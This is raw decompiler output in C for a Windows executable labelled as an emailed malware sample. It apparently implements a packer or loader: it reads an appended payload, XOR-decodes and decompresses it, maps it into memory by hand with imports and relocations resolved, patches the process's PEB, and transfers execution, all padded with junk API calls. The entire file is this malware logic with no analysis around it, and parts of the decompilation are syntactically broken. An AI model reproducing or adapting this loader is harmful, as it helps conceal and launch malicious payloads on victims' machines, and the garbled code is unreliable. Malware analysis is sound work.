// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0874/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401000(Eq_15 dwArg04, Eq_15 dwArg08, Eq_15 dwArg0C)
{
	globals->dw4040E0 = globals->dw4040E0 << 0x00000055;
	globals->dw4040E0 = globals->dw4040D8;
	CopyRect(fp - 0x0000003C, fp - 0x0000002C);
	int32 dwLoc0C_40 = 0x00000000;
	while (dwLoc0C_40 < dwArg0C)
	{
		dwArg04[dwLoc0C_40] = dwArg08[dwLoc0C_40];
		dwLoc0C_40 = dwLoc0C_40 + 0x00000001;
	}
	return;
}

word32 * fn004010C0(word32 * ebp, word32 dwArg04, Eq_15 dwArg08, up32 dwArg0C)
{
	globals->dw4040C0 = globals->dw4040E0 >> 0xFFFFFFBA;
	globals->dw4040E0 = dwLoc30;
	GetTextFaceA(GetDC(GetDesktopWindow()), 0x000000FF, fp + 0xFFFFFECC);
	if (true)
		globals->dw4040E0 = dwLoc30 >> (byte) globals->dw4040C0;
	fp->dwFFFFFFD0 = globals->dw4040C0 *s 0x0076CDDD;
	if (dwArg0C <u 0x00000001)
		;
	else
	{
		byte dl_77 = *dwArg04;
		up32 dwLoc0C_117 = 0x00000001;
		word32 dwLoc1C_113 = 0x00000000;
		do
		{
			up32 edx_95 = dwLoc0C_117 + 0x00000001;
			byte cl_92 = dwArg04[dwLoc0C_117];
			dwLoc0C_117 = edx_95;
			ui32 eax_100 = globals->dw4040FC << (byte) globals->dw4040EC;
			if ((word32) cl_92 != (word32) dl_77)
			{
				dwArg08[dwLoc1C_113] = cl_92;
				dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
			}
			else if ((word32) dwArg04[edx_95] == 0x00000000)
			{
				dwArg08[dwLoc1C_113] = dl_77;
				globals->dw4040FC = globals->dw4040EC << (byte) (dwLoc10 * 0x00000002) >> 0x00000025;
				dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
				dwLoc0C_117 = edx_95 + 0x00000001;
			}
			else
			{
				globals->dw4040FC = globals->dw4040EC *s 0x000BF8FD;
				word32 eax_175 = fn004012B0(fp - 0x00000014, dwArg04 + edx_95) + edx_95;
				globals->dw4040FC = globals->dw4040EC + eax_100 + dwLoc10;
				dwLoc0C_117 = fn004012B0(fp - 0x0000002C, dwArg04 + eax_175) + eax_175;
				up32 dwLoc20_194 = 0x00000000;
				while (dwLoc20_194 <u dwLoc14)
				{
					dwArg08[dwLoc1C_113] = dwArg08[dwLoc1C_113 - dwLoc2C];
					dwLoc1C_113 = dwLoc1C_113 + 0x00000001;
					dwLoc20_194 = dwLoc20_194 + 0x00000001;
				}
			}
		} while (dwLoc0C_117 <u dwArg0C);
	}
}

word32 fn004012B0(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc0C_13 = 0x00000000;
	word32 dwLoc28_15 = 0x00000000;
	do
	{
		word32 ecx_18 = (word32) dwArg08->b0000;
		globals->dw4040EC = globals->dw4040C4 *s dwLoc2C;
		word32 ecx_31 = dwLoc0C_13 << 0x00000007 | ecx_18 & 0x0000007F;
		word32 ecx_38 = dwLoc28_15 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc0C_13 = ecx_31;
		dwLoc28_15 = ecx_38;
	} while ((ecx_18 & 0x00000080) != 0x00000000);
	*dwArg04 = ecx_31;
	return ecx_38;
}

word32 fn00401330(Eq_15 dwArg04)
{
	word32 eax_37;
	word32 eax_29 = CreateFileA(dwArg04, 0x80000000, 0x00000001, 0x00000000, 0x00000003, 0x00000080, 0x00000000);
	if (eax_29 == 0xFFFFFFFF)
		eax_37 = 0x00000000;
	else
		eax_37 = eax_29;
	return eax_37;
}

void fn00401390(word32 dwArg04, byte bArg08, word32 dwArg0C)
{
	globals->dw4040C4 = LoadBitmapW;
	int32 dwLoc0C_10 = 0x00000000;
	while (dwLoc0C_10 < dwArg0C)
	{
		dwArg04[dwLoc0C_10] = bArg08;
		dwLoc0C_10 = dwLoc0C_10 + 0x00000001;
	}
	return;
}

void fn004013E0(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_910 * fs, word32 dwArg04, word32 dwArg08)
{
	int32 edx_21 = 0x000E116E >> (byte) globals->dw4040EC;
	globals->dw4040EC = GetMonitorInfoW;
	globals->dw4040FC = GetMenuItemInfoW;
	globals->dw4040FC = 0x000D24CD - edx_21;
	GetModuleHandleA(0x00000000);
	globals->dw4040FC = globals->dw4040FC << (byte) globals->dw4040FC << (byte) globals->dw4040FC;
	LoadIconA(GetModuleHandleA(0x00000000), 0x00404000);
	LoadCursorA(0x00000000, 0x00007F00);
	globals->dw4040C4 = globals->dw4040EC *s dwLoc24 + 0x00029170;
	globals->dw4040FC = globals->dw4040C4 + 0xFFF52780 + edx_21 >> 0x0000007C;
	globals->dw4040FC = 0x000B0295;
	globals->dw4040FC = 0x000A2B69 << (byte) dwLoc0C;
	RegisterClassA(&fp->tFFFFFF44);
	if (dwArg08 != 0x00000001)
		globals->dw4040E8 = 0x00000000;
	else
	{
		globals->dw4040E8 = 0x00000001;
		globals->t4040D0 = dwArg04;
	}
	Eq_15 dwLoc30_135;
	fp->dwFFFFFFD8 = 0x00000000;
	Mem101[fp - 0x00000100:word32] = GetModuleHandleA(0x00000000);
	CreateWindowExA(0x00000000, 0x00404044, 0x00404034, 0x00000001, 0x00053174, 0x00232159, 0x00000328, 0x00006873, 0x00000000, 0x00000000, null, 0x00000000);
	globals->dw4040FC = LoadAcceleratorsW;
	if (globals->dw4040E8 == 0x00000000)
	{
		fp->dwFFFFFFD8 = 0x00000000;
		dwLoc30_135 = GetModuleHandleA(0x00000000);
	}
	else
		dwLoc30_135 = dwArg04;
	globals->dw4040E0 = globals->dw4040BC;
	fp->dwFFFFFFD8 = &fp->tFFFFFF04;
	CopyRect(&fp->tFFFFFF04, null);
	globals->dw4040C8 = 0x00000000;
	globals->dw4040FC = CharUpperW;
	word32 ecx_170 = dwLoc30_135 + Mem160[dwLoc30_135 + 0x0000003C:word32];
	fp->dwFFFFFFD8 = 0x00000044;
	fp->dwFFFFFFD8 = fp - 0x0000007C;
	fn00401390(0x00000000, 0x00, 0x00000000);
	Mem193[fp - 0x000000FC:word32] = fp - 0x0000007C;
	GetStartupInfoA(null);
	globals->dw4040EC = EnumThreadWindows;
	if (true)
	{
l00401C5E:
		return;
	}
	else
	{
		globals->dw4040C4 = 0x000F1737 - globals->dw4040FC - dwLoc0C + globals->dw4040C4;
		globals->dw4040BC = 0x00166D1E;
		fp->dwFFFFFFD8 = 0x00000000;
		Eq_15 eax_288 = LoadCursorA(0x00000000, 0x00404068);
		if (eax_288 != 0x00000000)
		{
			fp->dwFFFFFFD8 = globals->dw4040D8 << (byte) globals->dw4040E0;
			Mem739[fp - 0x000000FC:word32] = eax_288;
			SetCursor(0x00404068);
			fp->dwFFFFFFD8 = globals->dw4040BC;
		}
		globals->dw4040EC = MoveWindow;
		Eq_502 * eax_311 = ((word32) ecx_170->w0006 - 0x00000001) *s 0x00000028 + (&ecx_170->w0014 + (word32) ecx_170->w0014);
		word32 eax_317 = eax_311->dw0010 - 0x00000001 + ecx_170->t003C;
		Eq_529 eax_327 = SEQ(SEQ(0x00000000, eax_317) % ecx_170->t003C, eax_317) /u ecx_170->t003C *s ecx_170->t003C + eax_311->dw0014;
		globals->dw4040FC = EnumDisplaySettingsExA;
		Eq_15 eax_334 = fn00402690(0x00000200);
		if (eax_334 == 0x00000000)
			goto l00401C5E;
		else
		{
			globals->dw4040C4 = IsClipboardFormatAvailable;
			fp->dwFFFFFFD8 = 0x00000200;
			Mem348[fp - 0x00000100:word32] = eax_334;
			GetModuleFileNameA(dwLoc30_135, null, 0x00000200);
			globals->dw4040BC = 0xFF8EC512;
			fp->dwFFFFFFD8 = 0x00404090;
			fp->dwFFFFFFD8 = 0x00000000;
			Eq_15 eax_361 = LoadCursorA(null, 0x00000200);
			if (eax_361 != 0x00000000)
			{
				fp->dwFFFFFFD8 = 0x0014B79F;
				Mem724[fp - 0x000000FC:word32] = eax_361;
				SetCursor(&globals->t404090);
				fp->dwFFFFFFD8 = 0x006DE1D0;
			}
			globals->dw4040BC = 0x45480000;
			Eq_15 eax_382 = fn00401330(eax_334);
			if (eax_382 == 0x00000000)
				goto l00401C5E;
			else
			{
				int32 edx_395 = globals->dw4040FC >> (byte) (globals->dw4040C4 *s 0x0001F3F6 + 0x0007169A);
				globals->dw4040FC = ToAsciiEx;
				Mem403[fp - 0x00000100:word32] = eax_382;
				Eq_669 eax_406 = GetFileSize(null, 0x00000000) - eax_327;
				globals->dw4040EC = BroadcastSystemMessageW;
				if (eax_406 == 0x00000000)
					goto l00401C5E;
				else
				{
					fp->dwFFFFFFD8 = eax_406.u0;
					Eq_15 eax_420 = fn00402690(0x00000000);
					if (eax_420 == 0x00000000)
						goto l00401C5E;
					else
					{
						Mem443[fp - 0x00000108:word32] = eax_382;
						SetFilePointer(0x00000000, eax_327, 0x00000000, 0x00000000);
						Mem456[fp - 0x00000108:word32] = eax_420;
						Mem459[fp - 0x0000010C:word32] = eax_382;
						if (ReadFile(0x00006873, 0x00000000, eax_406, fp - 0x00000084, 0x00000000) == 0x00000000)
							goto l00401C5E;
						else if (dwLoc84 != eax_406)
							goto l00401C5E;
						else
						{
							globals->dw4040EC = SetMenuInfo;
							globals->dw4040FC = 0x0005A588 << (byte) edx_395 >> (byte) (globals->dw4040EC *s edx_395);
							Mem488[fp - 0x000000FC:word32] = eax_382;
							CloseHandle(0x00000000);
							globals->dw4040C4 = RegisterClassExA;
							if (dwLoc84 != eax_406)
								goto l00401C5E;
							else
							{
								globals->dw4040EC = SubtractRect;
								fn00401000(eax_420, eax_420 - 0x00000040 + eax_406, 0x00000040);
								globals->dw4040EC = GetMenuDefaultItem;
								int32 dwLoc28_515 = 0x00226BF3;
								if (GetBkColor(0x0015C561) == 0xFFFFFFFF)
								{
									globals->dw4040BC = globals->dw4040C8 - 0x00505D23;
									dwLoc28_515 = 0x00226BF3 << (byte) (globals->dw4040E0 + globals->dw4040D8);
								}
								globals->dw4040D8 = dwLoc28_515 - globals->dw4040C8 << 0xFFFFFF86;
								word32 edx_529 = Mem527[eax_420 + 0x00000000:word32];
								globals->dw4040C4 = EnumClipboardFormats;
								globals->dw4040D8 = dwLoc28_515 *s 0x0042E46A;
								fp->dwFFFFFFD8 = 0x00009963;
								if (GetBkColor(0x0015C561) == 0xFFFFFFFF)
									;
								word32 edx_550 = Mem537[eax_420 + 0x00000004:word32];
								up32 dwLoc10_552 = 0x00000000;
								while (dwLoc10_552 <u edx_529)
								{
									(eax_420 + dwLoc10_552)->dw0008 = (eax_420 + dwLoc10_552)->dw0008 ^ 0x00000CFA;
									dwLoc10_552 = dwLoc10_552 + 0x00000008;
								}
								Mem577[fp - 0x000000FC:word32] = edx_550;
								globals->t4040E4 = fn00402690(0x0015C561);
								if (globals->t4040E4 == 0x00000000)
									ExitProcess(0x01795716);
								word32 esp_635;
								word32 ebp_594 = fn004010C0(fp - 0x00000004, eax_420 + 0x00000008, Mem580[0x004040E4:word32], edx_529);
								fp->dwFFFFFFD8 = 0x00401B9A;
								ebp_594->dwFFFFFFF8 = 0x000157CC << (byte) globals->dw4040C4;
								ebp_594->dwFFFFFFF8 = fp->dwFFFFFFD8;
								globals->dw4040EC = globals->dw4040C4 << (byte) globals->dw4040FC;
								globals->ptr4040F4 = fs->ptr0018;
								ebp_594->dwFFFFFFF8 = 0x00000000;
								globals->dw4040CC = edi;
								globals->dw4040B8 = esi;
								globals->dw4040DC = ebx;
								ebp_594->dwFFFFFFF8 = ebp_594->dwFFFFFFF8 >> (byte) ebp_594->dwFFFFFFF8 >> 0xFFFFFFDD;
								globals->ptr4040D4 = ebp_594;
								globals->dw4040FC = ebp_594->dwFFFFFFF8 - 0x000ED24F - ebp_594->dwFFFFFFF8;
								if (globals->dw4040E8 != 0x00000000)
								{
									Mem691[fp - 0x000000FC:word32] = Mem629[ebp_594 - 0x0000000C:word32] - Mem629[0x004040D0:word32];
									fn00401C70(dwArg00);
									esp_635 = fp - 0x000000F8;
								}
								else
								{
									fp->dwFFFFFFD8 = 0x00000000;
									Mem702[fp - 0x000000FC:word32] = Mem695[ebp_594 - 0x0000000C:word32] - GetModuleHandleA(fp->dwFFFFFFD8);
									fn00401C70(dwArg00);
									esp_635 = fp - 0x000000F8;
								}
								Eq_15 * esp_637 = esp_635 - 0x00000004;
								Mem638[esp_637 + 0x00000000:word32] = Mem629[0x004040E4:word32];
								if (fn00401F00(dwArg00) == 0x00000000)
								{
									Mem681[esp_637 + 0x00000000:word32] = Mem638[0x004040E4:word32];
									fn00402650(dwArg00);
									Mem685[esp_637 + 0x00000000:word32] = 0x00582353;
									ExitProcess(Mem685[esp_637 + 0x00000000:UINT]);
								}
								globals->dw4040EC = globals->dw4040EC >> (byte) ebp_594->dwFFFFFFF8 >> (byte) ebp_594->dwFFFFFFF8;
								globals->dw4040FC = globals->dw4040C4 - 0x0008ED7B;
								globals->dw4040FC = ebp_594->dwFFFFFFF8 << 0xFFFFFFC9;
								int32 edx_667 = 0x00000A7D << (byte) (ebp_594->dwFFFFFFF8 *s ebp_594->dwFFFFFFF8);
								globals->dw4040FC = edx_667;
								int32 ecx_674 = globals->dw4040EC;
								uint8 cl_675 = (byte) ecx_674;
								int32 eax_676 = globals->dw4040FC << (byte) ebp_594->dwFFFFFFF8 >> cl_675;
								ebp_594->dwFFFFFFF8 = eax_676;
								Mem678[0x004040F8:word32]();
								return;
							}
						}
					}
				}
			}
		}
	}
}

void fn00401C70(word32 dwArg04)
{
fn00401C70_entry:
l00401C70:
	Eq_15 dwLoc3C_16
	globals->dw4040EC = GetKeyboardLayout;
	globals->dw4040C4 = LoadMenuIndirectW;
	branch globals->dw4040E8 == 0x00000000 l00401CA1
l00401C96:
	dwLoc3C_16 = globals->t4040D0;
	goto l00401CAC
l00401CA1:
	dwLoc44 = 0x00000000
	dwLoc3C_16 = GetModuleHandleA(0x00000000);
l00401CAC:
	branch dwLoc3C_16 != 0x00000000 l00401CB9
l00401CB2:
	goto l00401E69
l00401CB9:
	globals->dw4040C4 = GetKeyboardType;
	globals->dw4040C4 = globals->dw4040EC *s dwLoc2C *s 0x00059D4E;
	word32 eax_54 = dwLoc3C_16 + Mem51[dwLoc3C_16 + 0x0000003C:word32]
	fp->tFFFFFFBC.u0 = 0x00000040;
	globals->t4040F0 = VirtualAlloc(0x00000000, eax_54->t0050, 0x00003000, null);
	branch globals->t4040F0 != 0x00000000 l00401D10
l00401D09:
	goto l00401E69
l00401D10:
	fp->tFFFFFFBC = eax_54->t0050;
	Mem85[fp - 0x00000048:word32] = dwLoc3C_16
	fn00401000(globals->t4040F0, 0x00003000, dwLoc44)
	word32 edx_91 = globals->t4040F0 - dwLoc3C_16
	branch eax_54->dw00A4 == 0x00000000 l00401E57
l00401D5A:
	Eq_1177 * dwLoc14_131 = dwLoc3C_16 + Mem85[eax_54 + 0x000000A0:word32]
l00401D69:
	branch dwLoc14_131->dw0004 == 0x00000000 l00401E57
l00401D76:
	uint32 edx_155 = dwLoc14_131->dw0004 - 0x00000008 >>u 0x00000001
	word16 * ecx_163[] = &dwLoc14_131->a0008[0]
	uint32 dwLoc0C_170 = 0x00000000
	goto l00401DD7
l00401DCE:
	dwLoc0C_170 = dwLoc0C_170 + 0x00000001;
l00401DD7:
	branch dwLoc0C_170 >=u edx_155 l00401E46
l00401DDF:
	branch (word32) ecx_163[dwLoc0C_170] >> 0x0000000C != 0x00000003 l00401E44
l00401E05:
	(Mem85[0x004040F0:word32] + Mem85[dwLoc14_131 + 0x00000000:word32])[(word32) ecx_163[dwLoc0C_170] & 0x00000FFF] = (Mem85[0x004040F0:word32] + Mem85[dwLoc14_131 + 0x00000000:word32])[(word32) ecx_163[dwLoc0C_170] & 0x00000FFF] + edx_91;
l00401E44:
	goto l00401DCE
l00401E46:
	dwLoc14_131 = dwLoc14_131 + Mem85[dwLoc14_131 + 0x00000004:word32];
	goto l00401D69
l00401E57:
l00401E69:
	return
fn00401C70_exit:
}

word32 fn00401F00(word32 dwArg04)
{
	word32 eax_277;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_1252 * dwLoc2C_121 = &edx_16->w0014 + (word32) edx_16->w0014;
	Eq_15 eax_33 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	if (eax_33 == 0x00000000)
		eax_277 = 0x00000000;
	else
	{
		globals->dw4040C4 = 0x00000000 << (byte) (dwLoc20 - globals->dw4040C4);
		Mem106[fp - 0x0000005C:word32] = Mem97[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem97[edx_16 + 0x00000006:word16] *s 0x00000028;
		Mem109[fp - 0x00000060:word32] = dwArg04;
		fn00401000(eax_33, 0x00003000, 0x00000040);
		up32 dwLoc10_115 = 0x00000000;
		while (dwLoc10_115 <u (word32) edx_16->w0006)
		{
			globals->dw4040FC = 0x00000000;
			if (dwLoc2C_121->dw0014 != 0x00000000 && dwLoc2C_121->dw0010 != 0x00000000)
			{
				word32 eax_159 = dwLoc2C_121->dw0010 - 0x00000001 + edx_16->t003C;
				fn00401000(eax_33 + Mem130[dwLoc2C_121 + 0x0000000C:word32], dwArg04 + Mem130[dwLoc2C_121 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_159) % edx_16->t003C, eax_159) /u edx_16->t003C *s edx_16->t003C);
			}
			globals->dw4040FC = globals->dw4040FC *s dwLoc30;
			dwLoc2C_121 = dwLoc2C_121 + 1;
			dwLoc10_115 = dwLoc10_115 + 0x00000001;
		}
		word32 edx_187 = eax_33 + Mem109[eax_33 + 0x0000003C:word32];
		Eq_1316 * dwLoc54_193 = eax_33 + Mem109[edx_187 + 0x00000080:word32];
		while (dwLoc54_193->dw0010 != 0x00000000)
		{
			Eq_15 eax_218 = GetModuleHandleA(eax_33 + Mem109[dwLoc54_193 + 0x0000000C:word32]);
			Eq_15 dwLoc18_220 = eax_218;
			if (eax_218 == 0x00000000)
			{
				if (globals->dw4040E8 != 0x00000000)
				{
					eax_277 = 0x00000000;
					goto l004024E7;
				}
				Eq_15 eax_355 = LoadLibraryA(eax_33 + Mem109[dwLoc54_193 + 0x0000000C:word32]);
				dwLoc18_220 = eax_355;
				dwLoc20 = globals->dw4040C4 *s 0x000E3550 *s dwLoc24;
				if (eax_355 == 0x00000000)
				{
					eax_277 = 0x00000000;
					goto l004024E7;
				}
				goto l004020AA;
			}
l004020AA:
			Eq_1391 * dwLoc40_238;
			Eq_1392 * dwLoc28_237;
			dwLoc30 = globals->dw4040FC << (byte) (dwLoc24 + globals->dw4040EC);
			if (dwLoc54_193->dw0000 != 0x00000000)
			{
				dwLoc28_237 = eax_33 + Mem109[dwLoc54_193 + 0x00000000:word32];
				dwLoc40_238 = eax_33 + Mem109[dwLoc54_193 + 0x00000010:word32];
			}
			else
			{
				dwLoc28_237 = eax_33 + Mem109[dwLoc54_193 + 0x00000010:word32];
				dwLoc40_238 = eax_33 + Mem109[dwLoc54_193 + 0x00000000:word32];
			}
			if (dwLoc54_193->dw0010 != 0x00000000 && dwLoc54_193->dw0000 != 0x00000000)
			{
				fp->dwFFFFFFEC = 0x00000001;
				goto l00402115;
			}
l00402115:
			while (dwLoc28_237->dw0000 != 0x00000000)
			{
				dwLoc30 = globals->dw4040C4 - dwLoc20;
				if ((dwLoc28_237->dw0000 & 0x80000000) != 0x00000000)
					dwLoc28_237->dw0000 = GetProcAddress(dwLoc18_220, dwLoc28_237->dw0000 & 0x7FFFFFFF);
				else
					dwLoc28_237->dw0000 = GetProcAddress(dwLoc18_220, dwLoc28_237->dw0000 + 0x00000002 + eax_33);
				if (dwLoc28_237->dw0000 == 0x00000000)
				{
					eax_277 = 0x00000000;
					goto l004024E7;
				}
				if (0x00000000 != 0x00000000)
					dwLoc40_238->dw0000 = dwLoc28_237->dw0000;
				dwLoc28_237 = dwLoc28_237 + 1;
				dwLoc40_238 = dwLoc40_238 + 1;
			}
			dwLoc54_193 = dwLoc54_193 + 1;
		}
		if (globals->dw4040E8 != 0x00000000)
		{
			word32 ecx_676 = globals->t4040D0 - edx_187->t0034;
			if (edx_187->dw00A4 != 0x00000000)
			{
				Eq_1486 * dwLoc1C_685 = eax_33 + Mem109[edx_187 + 0x000000A0:word32];
				while (dwLoc1C_685->dw0004 != 0x00000000)
				{
					uint32 ecx_701 = dwLoc1C_685->dw0004 - 0x00000008 >>u 0x00000001;
					word16 * edx_704[] = &dwLoc1C_685->a0008[0];
					uint32 dwLoc10_707 = 0x00000000;
					while (dwLoc10_707 <u ecx_701)
					{
						dwLoc30 = 0x00000000;
						if ((word32) edx_704[dwLoc10_707] >> 0x0000000C == 0x00000003)
							(eax_33 + Mem109[dwLoc1C_685 + 0x00000000:word32])[(word32) edx_704[dwLoc10_707] & 0x00000FFF] = (eax_33 + Mem109[dwLoc1C_685 + 0x00000000:word32])[(word32) edx_704[dwLoc10_707] & 0x00000FFF] + ecx_676;
						dwLoc10_707 = dwLoc10_707 + 0x00000001;
					}
					dwLoc1C_685 = dwLoc1C_685 + Mem109[dwLoc1C_685 + 0x00000004:word32];
				}
			}
		}
		Eq_15 edx_385 = edx_187->t0050;
		fp->dwFFFFFFEC = 0x00000004;
		Eq_1457 eax_396 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, edx_385, 0x00000000);
		if (eax_396 == 0x00000000)
			eax_277 = 0x00000000;
		else
		{
			globals->dw4040FC = dwLoc20 + 0x00073B70;
			if (globals->dw4040E8 != 0x00000000)
			{
				Mem641[fp - 0x0000005C:word32] = Mem407[0x004040D0:word32];
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000022;
				fp->dwFFFFFFEC = eax_396.u0;
				globals->t4040F0 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (RECT) 0x00000004, 0x00000000, 0x00000000, null);
			}
			else
			{
				Mem659[fp - 0x0000005C:word32] = Mem407[edx_187 + 0x00000034:word32];
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000000;
				fp->dwFFFFFFEC = 0x00000022;
				fp->dwFFFFFFEC = eax_396.u0;
				globals->t4040F0 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, (RECT) 0x00000004, 0x00000000, 0x00000000, 0x00000000);
			}
			if (globals->t4040F0 == 0x00000000)
			{
				dwLoc30 = dwLoc20 << (byte) (dwLoc24 *s dwLoc30);
				if (globals->dw4040E8 == 0x00000000)
					if (UnmapViewOfFile(edx_187->t0034) == 0x00000000)
					{
						fp->dwFFFFFFEC = 0x00000000;
						Mem629[fp - 0x00000064:word32] = Mem625[edx_187 + 0x00000034:word32];
						if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
							eax_277 = 0x00000000;
						else
							goto l00402395;
					}
					else
						goto l00402395;
				else if (UnmapViewOfFile(globals->t4040D0) == 0x00000000)
				{
					fp->dwFFFFFFEC = 0x00000000;
					Mem603[fp - 0x00000064:word32] = Mem600[0x004040D0:word32];
					if (VirtualFree(null, 0x00000000, 0x00008000) == 0x00000000)
						eax_277 = 0x00000000;
					else
					{
l00402363:
l00402395:
						if (globals->dw4040E8 != 0x00000000)
						{
							Eq_15 ecx_547 = globals->t4040D0;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000022;
							globals->t4040F0 = MapViewOfFileEx(eax_396, 0x00000022, null, 0x00000000, 0x00000000, ecx_547);
						}
						else
						{
							Eq_15 ecx_565 = edx_187->t0034;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000000;
							fp->dwFFFFFFEC = 0x00000022;
							globals->t4040F0 = MapViewOfFileEx(eax_396, 0x00000022, null, 0x00000000, 0x00000000, ecx_565);
						}
						if (globals->t4040F0 != 0x00000000)
							goto l00402440;
						else
						{
							if (globals->dw4040E8 != 0x00000000)
							{
								fp->dwFFFFFFEC = 0x00003000;
								Mem525[fp - 0x00000064:word32] = Mem521[edx_187 + 0x00000050:word32];
								Mem528[fp - 0x00000068:word32] = Mem525[0x004040D0:word32];
								globals->t4040F0 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
							}
							else
							{
								fp->dwFFFFFFEC = 0x00003000;
								Mem539[fp - 0x00000064:word32] = Mem535[edx_187 + 0x00000050:word32];
								Mem543[fp - 0x00000068:word32] = Mem539[edx_187 + 0x00000034:word32];
								globals->t4040F0 = VirtualAlloc(null, 0x00000000, null, 0x00000040);
							}
							if (globals->t4040F0 == 0x00000000)
								eax_277 = 0x00000000;
							else
							{
l00402440:
								globals->dw4040FC = 0x0002634E << (byte) (globals->dw4040EC *s dwLoc08);
								fn00401000(globals->t4040F0, eax_33, edx_187->t0050);
								if (globals->dw4040E8 != 0x00000000)
									fn004024F0(globals->t4040D0, Mem428[0x004040F0:word32] + Mem428[edx_187 + 0x00000028:word32]);
								else
									fn004025E0(globals->t4040F0);
								globals->dw4040C4 = dwLoc20 - 0x00060CA5;
								Mem451[0x004040F8:word32] = Mem447[0x004040F0:word32] + Mem447[edx_187 + 0x00000028:word32];
								edx_187->ptr0028 = globals->ptr4040F8;
								globals->dw4040C4 = dwLoc30 >> (byte) globals->dw4040FC;
								eax_277 = 0x00000001;
							}
						}
					}
				}
				else
					goto l00402363;
			}
			else
				goto l00402440;
		}
	}
l004024E7:
	return eax_277;
}

void fn004024F0(Eq_15 dwArg04, word32 dwArg08)
{
	globals->dw4040FC = globals->dw4040EC - 0x000DC541 << 0xFFFFFFF7;
	Eq_1930 * ecx_23 = globals->ptr4040F4->ptr0030->ptr000C->ptr000C;
	globals->dw4040FC = 0x000EDB03 >> (byte) globals->dw4040EC >> 0xFFFFFF40;
	Eq_1930 * dwLoc18_24 = ecx_23;
	while (0x00000001 != 0x00000000)
	{
		int32 edx_64 = globals->dw4040C4 + 0x0009CD1D - globals->dw4040FC >> (byte) globals->dw4040EC;
		if (dwLoc18_24 == null)
			goto l004025D4;
		globals->dw4040FC = globals->dw4040C4 *s edx_64 *s dwLoc24;
		if (dwLoc18_24->dw0018 == dwArg04)
		{
			dwLoc18_24->dw001C = dwArg08;
			goto l004025D4;
		}
		globals->dw4040C4 = globals->dw4040C4 - dwLoc24;
		Eq_1930 * ecx_90 = dwLoc18_24->ptr0000;
		dwLoc18_24 = ecx_90;
		if (ecx_90 == ecx_23)
			goto l004025D4;
	}
l004025D4:
	return;
}

void fn004025E0(Eq_15 dwArg04)
{
	Eq_912 * ecx_12 = globals->ptr4040F4;
	word32 eax_10 = globals->dw4040EC + dwLoc10;
	Eq_1935 * eax_23 = ecx_12->ptr0030;
	globals->dw4040C4 = 0x00000DDB;
	eax_23->dw0008 = dwArg04;
	globals->dw4040C4 = globals->dw4040FC + globals->dw4040EC << (byte) eax_10;
	return;
}

void fn00402650(word32 dwArg04)
{
	globals->dw4040EC = dwLoc0C *s dwLoc0C >> 0xFFFFFF9F;
	HeapFree(GetProcessHeap(), 0x00000000, dwArg04);
	return;
}

word32 fn00402690(word32 dwArg04)
{
	globals->dw4040C4 = dwLoc10 + 0x00019236 >> (byte) globals->dw4040C4;
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

